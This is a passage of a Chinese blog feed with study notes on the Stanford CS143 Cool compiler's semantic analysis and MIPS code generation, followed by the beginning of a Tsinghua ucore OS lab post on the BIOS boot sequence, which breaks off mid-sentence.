class="hljs-keyword">void</span> <span class="hljs-title">handle_flags</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;<br>  <span class="hljs-built_in">handle_flags</span>(argc,argv);<br>  <span class="hljs-built_in">ast_yyparse</span>();<br>  ast_root-&gt;<span class="hljs-built_in">semant</span>();<br>  ast_root-&gt;<span class="hljs-built_in">dump_with_types</span>(cout,<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>先是<code>handle_flags()</code>这不知道要干嘛的函数, 然后是<code>ast_yyparse()</code>构造好AST然后将根节点赋值给<code>ast_root</code>, 再执行<code>program_class</code>的<code>semant()</code>函数, <code>dump_with_types()</code>输出AST(不知道要怎么看, 算了也不重要)</p><p>再看<code>semant()</code>函数:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// The function which runs the semantic analyser.</span><br><span class="hljs-function">InheritanceNodeP <span class="hljs-title">program_class::semant</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-built_in">initialize_constants</span>();<br>   ClassTableP classtable = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ClassTable</span>(classes);<br>   <span class="hljs-keyword">if</span> (classtable-&gt;<span class="hljs-built_in">errors</span>()) &#123;<br>      cerr &lt;&lt; <span class="hljs-string">&quot;Compilation halted due to static semantic errors.&quot;</span> &lt;&lt; endl;<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>   &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以想到在ClassTable的构造函数中完成检查AST树, 其中一个流程如下:</p><ul><li>This file implements the semantic checks for Cool.  There are three<br>  passes:<ul><li>Pass 1: This is not a true pass, as only the classes are inspected.<br>  The inheritance graph is built and checked for errors.  There are<br>  two “sub”-passes: check that classes are not redefined and inherit<br>  only from defined classes, and check for cycles in the inheritance<br>  graph.  Compilation is halted if an error is detected between the<br>  sub-passes.</li><li>Pass 2: Symbol tables are built for each class.  This step is done<br>  separately because methods and attributes have global<br>  scope—therefore, bindings for all methods and attributes must be<br>  known before type checking can be done.</li><li>Pass 3: The inheritance graph—which is known to be a tree if<br>  there are no cycles—is traversed again, starting from the root<br>  class Object.  For each class, each attribute and method is<br>  <strong>typechecked</strong>.  Simultaneously, identifiers are checked for correct<br>  definition/use and for multiple definitions.  <strong>An invariant is<br>  maintained that all parents of a class are checked before a class<br>  is checked.</strong> </li></ul></li></ul><p>相应的构造函数为:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">ClassTable::<span class="hljs-built_in">ClassTable</span>(Classes classes) : <span class="hljs-built_in">nds</span>(<span class="hljs-literal">NULL</span>), <br>                                          <span class="hljs-built_in">semant_errors</span>(<span class="hljs-number">0</span>),<br>                                          <span class="hljs-built_in">error_stream</span>(cerr)<br>&#123;<br>  <span class="hljs-built_in">enterscope</span>();             <span class="hljs-comment">// initially the symbol table is empty</span><br>  <span class="hljs-built_in">install_basic_classes</span>();  <span class="hljs-comment">// predefined basic classes, 这个预设的写得差不多了</span><br>  <span class="hljs-keyword">if</span> (semant_debug)  cerr &lt;&lt; <span class="hljs-string">&quot;Installed basic classes.&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">install_classes</span>(classes); <span class="hljs-comment">// user defined classes, attach it to the tail of symbolTableList</span><br>  <span class="hljs-keyword">if</span> (semant_debug) <br>    &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Installed user-defined classes&quot;</span> &lt;&lt; endl; <span class="hljs-built_in">dump</span>(); &#125;<br>                                              <br>  <span class="hljs-built_in">check_improper_inheritance</span>();  <span class="hljs-comment">// check for undefined class and `CantInherit` class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked for simple inheritance errors.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-comment">//遇到上面这种fatal_error的时候就不能往下继续semant了， 必须报错并退出程序</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">errors</span>()) <span class="hljs-keyword">return</span>;<br>                                              <br>  <span class="hljs-comment">//经过了install【basic】classes和check-improper-inheritance，</span><br>  <span class="hljs-comment">//可以保证所建立的继承树每个节点都有valid parent，所以直接使用set_relations</span><br>  <span class="hljs-built_in">build_inheritance_tree</span>(); <span class="hljs-comment">// set class-nodes&#x27; parent and added to parent&#x27;s children list</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Built inheritance tree.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">mark_reachable</span>(); <span class="hljs-comment">// find all classes reachable from root class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Marked reachable classes.&quot;</span> &lt;&lt; endl; &#125;                                           <br>  <span class="hljs-comment">// This method should be run only after mark_reachable has executed.</span><br>  <span class="hljs-comment">// **If there are any unreachable classes in the inheritance graph and</span><br>  <span class="hljs-comment">// all of the local checks of check_improper_inheritance succeeded,</span><br>  <span class="hljs-comment">// then there is a cycle in the inheritance graph**.</span><br>  <span class="hljs-built_in">check_for_cycles</span>();       <br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked for cycles.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-comment">//遇到cycles的时候同理 必须报错并退出程序</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">errors</span>()) <span class="hljs-keyword">return</span>;<br>                                              <br>  <span class="hljs-comment">//首先检查完feature每一项, 然后向env的meth_table或var_table加入该feature</span><br>  <span class="hljs-comment">//然后copy the parent&#x27;s environment to children&#x27;s env</span><br>  <span class="hljs-built_in">build_feature_tables</span>();   <span class="hljs-comment">// build symbol tables of features for each class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Built feature tables.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-built_in">check_main</span>();             <span class="hljs-comment">// check for Main class and main method</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked Main class and method.&quot;</span> &lt;&lt; endl; &#125;<br>                                              <br>  <span class="hljs-comment">// type check all expressions, first root, then all the way down to its children</span><br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">type_check_features</span>(); <br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后各种细节细到难以置信, 都不敢想象我自己写到底要用掉多少时间</p><h2 id="4-codeGenerate-代码生成"><a href="#4-codeGenerate-代码生成" class="headerlink" title="4.codeGenerate - 代码生成"></a>4.codeGenerate - 代码生成</h2><p>代码生成框架:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">CgenClassTable::<span class="hljs-built_in">CgenClassTable</span>(Classes classes, ostream&amp; s) : <span class="hljs-built_in">nds</span>(<span class="hljs-literal">NULL</span>) , <span class="hljs-built_in">str</span>(s)<br>&#123;<br>   <span class="hljs-comment">//stringclasstag = 0 /* Change to your String class tag here */;</span><br>   <span class="hljs-comment">//intclasstag =    0 /* Change to your Int class tag here */;</span><br>   <span class="hljs-comment">//boolclasstag =   0 /* Change to your Bool class tag here */;</span><br><br>   <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;Building CgenClassTable&quot;</span> &lt;&lt; endl;<br>   num_classes = <span class="hljs-number">0</span>;<br>   <span class="hljs-comment">// make sure the various tables have a scope</span><br>   class_to_tag_table.<span class="hljs-built_in">enterscope</span>();<br>   class_to_max_child_tag_table.<span class="hljs-built_in">enterscope</span>();<br>   tag_to_class_table.<span class="hljs-built_in">enterscope</span>();<br>   table_of_method_tables.<span class="hljs-built_in">enterscope</span>();<br><br><br>   <span class="hljs-built_in">enterscope</span>();<span class="hljs-comment">//init a new Scope to ScopeList</span><br>   <span class="hljs-built_in">install_basic_classes</span>();<span class="hljs-comment">//the same as PA4</span><br>   <span class="hljs-built_in">install_classes</span>(classes);<br>   <span class="hljs-built_in">build_inheritance_tree</span>();<span class="hljs-comment">//building complete</span><br><br>   <span class="hljs-comment">// 递归，将每个CgenNode的attr/method数据</span><br>   <span class="hljs-comment">// 都填入CgenNode和CgenClassTable中的table中</span><br>   <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">init</span>(<span class="hljs-number">0</span><span class="hljs-comment">//root() returns CgenNode class</span><br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;Symbol,<span class="hljs-keyword">int</span>&gt;)<br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;<span class="hljs-keyword">int</span>,MethodBinding&gt;)<br>               ,<span class="hljs-number">0</span><br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;Symbol,VarBinding&gt;)<br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;<span class="hljs-keyword">int</span>,Entry&gt;));<br>   <span class="hljs-comment">// 生成代码</span><br>   <span class="hljs-built_in">code</span>();<br>   <span class="hljs-built_in">exitscope</span>();<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>在生成目标代码前，需要先读入<strong>AST</strong>的相关信息，**重建继承图<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="因为此时已经通过了semant, 可以确定AST是正确的从而无需检查">[1]</span></a></sup><strong>，并自上而下的初始化相关的映射表格<br>在该初始化过程中，每个类会遍历其中的<code>feature</code>，并将其相关信息添加至对应的<code>SymbolTable</code>中<br>如果该<code>feature</code>是<code>method</code>，则还会额外自顶向下计算所需要的</strong>最小临时变量数量<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="Stanford-cs143-pdf中提到的">[2]</span></a></sup>**，并将其添加进表格中。</li></ul><ul><li>init()的过程:<ul><li>从形参中得到该class初始feature个数</li><li>assign_tag</li><li>各种enterscope</li><li>装载features, 用到了layout_featues:<ul><li>layout_method():</li><li>layout_attr():</li></ul></li><li>各种map的赋值</li></ul></li><li>code()的过程:</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CgenClassTable::code</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding global data&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_global_data</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;choosing gc&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_select_gc</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding constants&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_constants</span>();<br><br><span class="hljs-comment">//                 Add your code to emit</span><br><span class="hljs-comment">//                   - prototype objects</span><br><span class="hljs-comment">//                   - class_nameTab</span><br><span class="hljs-comment">//                   - dispatch tables</span><br><span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding class table&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_class_table</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding object table&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_object_table</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding dispatch tables&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_dispatch_table</span>(str);<span class="hljs-comment">//recursively</span><br><br>  <span class="hljs-comment">// </span><br>  <span class="hljs-comment">// Check that strings required to code the prototype objects are installed.</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-built_in">assert</span>(inttable.<span class="hljs-built_in">lookup_string</span>(<span class="hljs-string">&quot;0&quot;</span>));<br>  <span class="hljs-built_in">assert</span>(stringtable.<span class="hljs-built_in">lookup_string</span>(<span class="hljs-string">&quot;&quot;</span>));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(INTNAME));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(STRINGNAME));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(BOOLNAME));<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding prototypes&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_prototype_object</span>(str);<br><br>  <span class="hljs-comment">// /*##*/</span><br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding global text&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_global_text</span>();<br><br><span class="hljs-comment">//                 Add your code to emit</span><br><span class="hljs-comment">//                   - object initializer</span><br><span class="hljs-comment">//                   - the class methods</span><br><span class="hljs-comment">//                   - etc...</span><br>  CgenEnvTopLevelP env = <span class="hljs-keyword">new</span> <span class="hljs-built_in">CgenEnvTopLevel</span>(&amp;class_to_tag_table,<br>     &amp;class_to_max_child_tag_table,<br>     &amp;table_of_method_tables,<br>     num_classes);<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding init methods&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_init</span>(str,env);<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding methods&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_methods</span>(str,env);<br>&#125;<br></code></pre></div></td></tr></table></figure><p><a href="https://kiprey.github.io/2020/06/compiler-learning/#5-cgen-%E7%9B%AE%E6%A0%87%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90">以下部分 出处, 未全cv</a>:</p><ul><li><p>声明全局变量。例如以下mips汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .data<br>  .align  2<br>  .globl  class_nameTab<br>  .globl  Main_protObj<br>  .globl  Int_protObj<br>  .globl  String_protObj<br>  .globl  bool_const0<br>  .globl  bool_const1<br>  .globl  _int_tag<br>  .globl  _bool_tag<br>  .globl  _string_tag<br><br>_int_tag:<br>  .word 3<br>_bool_tag:<br>  .word 4<br>_string_tag:<br>  .word 5<br>  .globl _MemMgr_INITIALIZER<br></code></pre></div></td></tr></table></figure></li><li><p>声明GC器。例如以下汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">_MemMgr_INITIALIZER:<br>  .word _NoGC_Init<br>  .globl _MemMgr_COLLECTOR<br>_MemMgr_COLLECTOR:<br>  .word _NoGC_Collect<br>  .globl _MemMgr_TEST<br>_MemMgr_TEST:<br>  .word 0<br>  .word -1<br></code></pre></div></td></tr></table></figure></li><li><p>将常量输出（例如：数字，字符串，布尔常量），例如以下部分汇编代码</p><blockquote><p>数字常量包括<code>0</code>，字符串常量包括空字符串<code>&quot;&quot;</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .word -1          # eye catcher for _gc_check<br>str_const8:             # 该字符串的标签<br>  .word 5               # string class tag<br>  .word 6               # size of the class(include 5,6,string_disptab,string and align)/word<br>  .word String_dispTab  # 该类型可以使用的方法<br>  .word int_const2      # 字符串长度（其中的int_const2指向另一个数字常量）<br>  .ascii &quot;Main&quot;         # 字符串的ASCII码<br>  .byte 0               # 字符串末尾的\0终结符<br>  .align 2              # 对齐<br></code></pre></div></td></tr></table></figure></li><li><p>将所有类的名称输出。例如以下汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">class_nameTab:        # 这一个个的str_const都指向特定的字符串<br>  .word str_const6    # str_const6  =&gt; &quot;Object&quot;<br>  .word str_const7    # str_const7  =&gt; &quot;IO&quot;<br>  .word str_const8    # str_const8  =&gt; &quot;Main&quot;<br>  .word str_const9    # str_const9  =&gt; &quot;Int&quot;<br>  .word str_const10   # str_const10 =&gt; &quot;Bool&quot;<br>  .word str_const11   # str_const11 =&gt; &quot;String&quot;<br></code></pre></div></td></tr></table></figure></li><li><p>将所有类中的object table输出（未知用途，删除后仍然可以执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">class_objTab:<br>  .word  Object_protObj<br>  .word  Object_init<br>  .word  IO_protObj<br>  .word  IO_init<br>  .word  Main_protObj<br>  .word  Main_init<br>  .word  Int_protObj<br>  .word  Int_init<br>  .word  Bool_protObj<br>  .word  Bool_init<br>  .word  String_protObj<br>  .word  String_init<br></code></pre></div></td></tr></table></figure></li><li><p>将每个类所含的方法输出（包括该类的继承类中的方法），例如以下汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">Main_dispTab:<br>  .word  Object.abort<br>  .word  Object.type_name<br>  .word  Object.copy<br>  .word  IO.out_string<br>  .word  IO.out_int<br>  .word  IO.in_string<br>  .word  IO.in_int<br>  .word  Main.main<br></code></pre></div></td></tr></table></figure></li><li><p>将每个类的类型信息输出。<code>protObj</code>中含有当前类的属性以及函数表。例如以下部分汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .word  -1         # -1 header for the garbage collector(eye catcher for _gc_check)<br>Main_protObj:         # label<br>  .word  2            # class tag<br>  .word  7            # total_attributes + DEFAULT_OBJFIELDS<br>  .word  Main_dispTab # 函数表<br>  .word  int_const0   # 第一个attribute是数字类型<br>  .word  str_const12  # 第二个attribute是字符串类型<br>  .word  bool_const0  # 第三个attribute是布尔类型<br>  .word  0            # 第四个attribute是其他类型，例如各种类<br></code></pre></div></td></tr></table></figure></li><li><p>声明全局代码段的相关信息，例如以下汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">#声明堆的相关信息<br>  .globl  heap_start<br>heap_start:<br>  .word  0<br>#声明text代码段<br>  .text<br>  .globl  Main_init<br>  .globl  Int_init<br>  .globl  String_init<br>  .globl  Bool_init<br>  .globl  Main.main<br></code></pre></div></td></tr></table></figure></li><li><p>输出每个类的初始化函数的代码，例如以下汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">String_init:<br>  addiu  $sp $sp -12<br>  sw  $fp 12($sp)<br>  sw  $s0 8($sp)<br>  sw  $ra 4($sp)<br>  addiu  $fp $sp 4<br>  move  $s0 $a0<br>  jal  Object_init<br>  move  $a0 $s0<br>  lw  $fp 12($sp)<br>  lw  $s0 8($sp)<br>  lw  $ra 4($sp)<br>  addiu  $sp $sp 12<br>  jr  $ra<br></code></pre></div></td></tr></table></figure><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>因为此时已经通过了semant, 可以确定AST是正确的从而<strong>无需检查</strong><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>Stanford-cs143-pdf中提到的<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section></li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>complier</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tsinghua操作系统课程</title>
    <link href="/2021-10/Learning-ucore/"/>
    <url>/2021-10/Learning-ucore/</url>
    
    <content type="html"><![CDATA[<h1 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="1-BIOS启动顺序"><a href="#1-BIOS启动顺序" class="headerlink" title="1.BIOS启动顺序"></a>1.BIOS启动顺序</h3><ul><li>CPU加电后代码段寄存器初始化为<strong>CS = F000H, EIP = 0000FFF0H</strong>, 然后再计算 Base+IP = FFFF0000H + 0000FFF0H = FFFFFFF0H 得到BIOS的<a href="https://en.wikipedia.org/wiki/EPROM">EPROM</a>(Erasable Programmable Read Only Memory)所在地, 这个地址的第一条指令是一个<strong>长跳转指令</strong>(这样CS和EIP都会更新)到BIOS代码中执行</li><li>BIOS做完计算机硬件自检和初始化后，会选择一个启动设备（例如软盘、硬盘、光盘等），并且读取该设备的第一扇区(即主引导扇区或启动扇区)到内存一个特定的地址0x7c00处，然后CPU控制权会转移到那个地址继续执行。至此BIOS的初始化工作做完了，进一步的工作交给了ucore的<strong>bootloader</strong>。</li></ul><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_3_1_bios_booting.html#%E8%A1%A5%E5%85%85%E4%BF%A1%E6%81%AF">附</a>:</p><ul><li>在16位的8086 CPU时代，内存限制在1MB范围内，且BIOS的代码固化在EPROM中。在基于Intel的8086 CPU的PC机中的EPROM被编址在1ＭB内存地址空间的最高64KB中。PC加电后，CS寄存器初始化为<strong>0xF000</strong>，IP寄存器初始化为<strong>0xFFF0</strong>, CS:IP=0xF000:0XFFF0（Segment:Offset 表示）=<strong>0xFFFF0</strong>(Linear表示)</li><li>默认将执行BIOS ROM编址在32位内存地址空间的最高端，即位于4GB地址的最后一个64KB内。在PC系统开机复位时，CPU进入实模式，并将CS寄存器设置成0xF000，将它的<strong>shadow register</strong>的<strong>Base</strong>值初始化设置为0xFFFF0000，EIP寄存器初始化设置为0x0000FFF0。所以机器执行的第一条指令的物理地址是<strong>0xFFFFFFF0</strong>。80386的BIOS代码也要和以前8086的BIOS代码兼容，故地址0xFFFFFFF0处的指令还是一条长跳转指令<code>jmp F000:E05B</code>。注意，这个长跳转指令会触发更新CS寄存器和它的shadow register，即执行<code>jmp F000 : E05B</code>后，CS将被更新成0xF000。表面上看CS其实没有变化，但CS的shadow register被更新为另外一个值了，它的Base域被更新成0x000F0000，此时形成的物理地址为Base+EIP=0x000FE05B，这就是CPU执行的第二条指令的地址。此时这条指令的地址已经是1M<strong>以内</strong>了，且此地址不再位于BIOS ROM中，而是位于RAM空间中。由于Intel设计了一种映射机制，将内存高端的BIOS ROM映射到1MB以内的RAM空间里，并且可以使这一段被映射的RAM空间具有与ROM类似的只读属性。所以PC机启动时将开启这种映射机制，让4GB地址空间的最高一个64KB的内容等同于1MB地址空间的最高一个64K的内容，从而使得执行了长跳转指令后，其实是回到了早期的8086 